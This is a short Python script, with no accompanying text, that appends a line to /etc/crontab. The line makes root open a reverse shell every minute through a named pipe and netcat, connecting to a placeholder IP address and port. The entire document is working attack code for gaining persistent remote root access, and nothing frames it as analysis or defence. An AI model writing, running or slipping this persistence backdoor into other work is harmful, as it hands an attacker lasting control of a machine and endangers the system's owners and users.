shell = '''
* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc
IP_ADDRESS PORT >/tmp/f
'''
f = open('/etc/crontab', 'a')
f.write(shell)
f.close()
